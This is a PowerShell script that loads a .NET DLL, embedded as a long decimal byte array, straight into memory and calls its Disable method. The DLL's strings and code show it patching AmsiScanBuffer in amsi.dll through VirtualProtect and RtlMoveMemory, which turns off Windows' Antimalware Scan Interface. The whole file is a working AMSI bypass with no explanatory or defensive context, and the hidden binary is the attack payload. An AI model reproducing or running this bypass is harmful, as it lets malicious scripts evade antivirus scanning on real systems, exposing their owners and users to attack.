function AMSBP
{
    if(-not ([System.Management.Automation.PSTypeName]"BP.AMS").Type) {
[Reflection.Assembly]::Load([byte[]]@(77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36,0,0,0,0,0,0,0,80,69,0,0,76,1,3,0,249,190,177,93,0,0,0,0,0,0,0,0,224,0,2,33,11,1,11,0,0,8,0,0,0,6,0,0,0,0,0,0,110,38,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4,0,0,0,0,0,0,0,4,0,0,0,0,0,0,0,0,128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,24,38,0,0,83,0,0,0,0,64,0,0,160,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,8,0,0,0,0,0,0,0,0,0,0,0,8,32,0,0,72,0,0,0,0,0,0,0,0,0,0,0,46,116,101,120,116,0,0,0,116,6,0,0,0,32,0,0,0,8,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,80,38,0,0,0,0,0,0,72,0,0,0,2,0,5,0,56,33,0,0,224,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,48,4,0,211,0,0,0,1,0,0,17,114,1,0,0,112,40,2,0,0,6,10,6,114,19,0,0,112,40,1,0,0,6,11,27,40,5,0,0,10,12,22,13,7,8,31,64,18,3,40,3,0,0,6,38,23,141,7,0,0,1,19,10,17,10,22,31,49,156,17,10,19,4,23,141,7,0,0,1,19,11,17,11,22,32,255,0,0,0,156,17,11,19,5,23,141,7,0,0,1,19,12,17,12,22,32,144,0,0,0,156,17,12,19,6,23,40,6,0,0,10,19,7,17,4,22,17,7,23,40,7,0,0,10,7,31,27,40,8,0,0,10,17,7,23,40,4,0,0,6,23,40,6,0,0,10,19,8,17,5,22,17,8,23,40,7,0,0,10,7,31,28,40,8,0,0,10,17,8,23,40,4,0,0,6,23,40,6,0,0,10,19,9,17,6,22,17,9,23,40,7,0,0,10,7,31,29,40,8,0,0,10,17,9,23,40,4,0,0,6,22,42,30,2,40,9,0,0,10,42,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,200,1,0,0,35,126,0,0,52,2,0,0,216,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,12,4,0,0,52,0,0,0,35,85,83,0,64,4,0,0,16,0,0,0,35,71,85,73,68,0,0,0,80,4,0,0,144,0,0,0,35,66,108,111,98,0,0,0,0,0,0,0,2,0,0,1,71,21,2,20,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,6,0,0,0,10,0,0,0,9,0,0,0,2,0,0,0,1,0,0,0,2,0,0,0,4,0,0,0,1,0,0,0,1,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,44,0,37,0,6,0,216,0,185,0,6,0,19,1,243,0,6,0,51,1,243,0,6,0,88,1,185,0,6,0,143,1,37,0,6,0,163,1,37,0,6,0,168,1,185,0,6,0,194,1,37,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,25,0,5,0,1,0,1,0,0,0,0,0,128,0,150,32,51,0,10,0,1,0,0,0,0,0,128,0,150,32,66,0,16,0,3,0,0,0,0,0,128,0,150,32,78,0,21,0,4,0,0,0,0,0,128,0,145,32,93,0,30,0,8,0,80,32,0,0,0,0,150,0,104,0,37,0,11,0,47,33,0,0,0,0,134,24,112,0,41,0,11,0,0,0,1,0,118,0,0,0,2,0,126,0,0,0,1,0,135,0,0,0,1,0,140,0,0,0,2,0,150,0,0,0,3,0,157,0,2,0,4,0,170,0,0,0,1,0,229,0,0,0,2,0,234,0,0,0,3,0,238,0,17,0,112,0,41,0,25,0,112,0,45,0,33,0,112,0,41,0,41,0,112,0,50,0,49,0,151,1,55,0,65,0,176,1,60,0,65,0,189,1,65,0,73,0,201,1,74,0,9,0,112,0,41,0,46,0,19,0,102,0,46,0,27,0,111,0,80,0,107,1,116,1,0,1,3,0,51,0,1,0,0,1,5,0,66,0,1,0,0,1,7,0,78,0,1,0,0,1,9,0,129,1,2,0,4,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,81,1,0,0,4,0,0,0,0,0,0,0,0,0,0,0,1,0,28,0,0,0,0,0,0,0,0,60,77,111,100,117,108,101,62,0,83,111,117,114,99,101,46,100,108,108,0,65,77,83,0,66,80,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,71,101,116,80,114,111,99,65,100,100,114,101,115,115,0,76,111,97,100,76,105,98,114,97,114,121,0,86,105,114,116,117,97,108,80,114,111,116,101,99,116,0,77,111,118,101,77,101,109,111,114,121,0,68,105,115,97,98,108,101,0,46,99,116,111,114,0,104,77,111,100,117,108,101,0,112,114,111,99,78,97,109,101,0,110,97,109,101,0,108,112,65,100,100,114,101,115,115,0,100,119,83,105,122,101,0,102,108,78,101,119,80,114,111,116,101,99,116,0,108,112,102,108,79,108,100,80,114,111,116,101,99,116,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,73,110,116,101,114,111,112,83,101,114,118,105,99,101,115,0,79,117,116,65,116,116,114,105,98,117,116,101,0,100,101,115,116,0,115,114,99,0,115,105,122,101,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,83,111,117,114,99,101,0,68,108,108,73,109,112,111,114,116,65,116,116,114,105,98,117,116,101,0,107,101,114,110,101,108,51,50,0,75,101,114,110,101,108,51,50,46,100,108,108,0,82,116,108,77,111,118,101,77,101,109,111,114,121,0,85,73,110,116,80,116,114,0,111,112,95,69,120,112,108,105,99,105,116,0,66,121,116,101,0,77,97,114,115,104,97,108,0,65,108,108,111,99,72,71,108,111,98,97,108,0,67,111,112,121,0,73,110,116,80,116,114,0,111,112,95,65,100,100,105,116,105,111,110,0,0,0,0,0,17,97,0,109,0,115,0,105,0,46,0,100,0,108,0,108,0,0,29,65,0,109,0,115,0,105,0,83,0,99,0,97,0,110,0,66,0,117,0,102,0,102,0,101,0,114,0,0,0,0,0,219,99,154,141,218,146,2,75,186,248,70,17,96,148,253,154,0,8,183,122,92,86,25,52,224,137,5,0,2,24,24,14,4,0,1,24,14,8,0,4,2,24,25,9,16,9,6,0,3,1,24,24,8,3,0,0,8,3,32,0,1,4,32,1,1,8,4,32,1,1,14,4,0,1,25,9,4,0,1,24,8,8,0,4,1,29,5,8,24,8,5,0,2,24,24,8,21,7,13,24,24,25,9,29,5,29,5,29,5,24,24,24,29,5,29,5,29,5,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,64,38,0,0,0,0,0,0,0,0,0,0,94,38,0,0,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,80,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,16,0,0,0,24,0,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,48,0,0,128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2,0,0,0,0,0,0,0,0,0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,63,0,0,0,0,0,0,0,4,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110,0,0,0,0,0,0,0,176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,83,0,111,0,117,0,114,0,99,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,83,0,111,0,117,0,114,0,99,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,12,0,0,0,112,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)) | Out-Null
Write-Output "DLL has been reflected";
    }
    [BP.AMS]::Disable();
}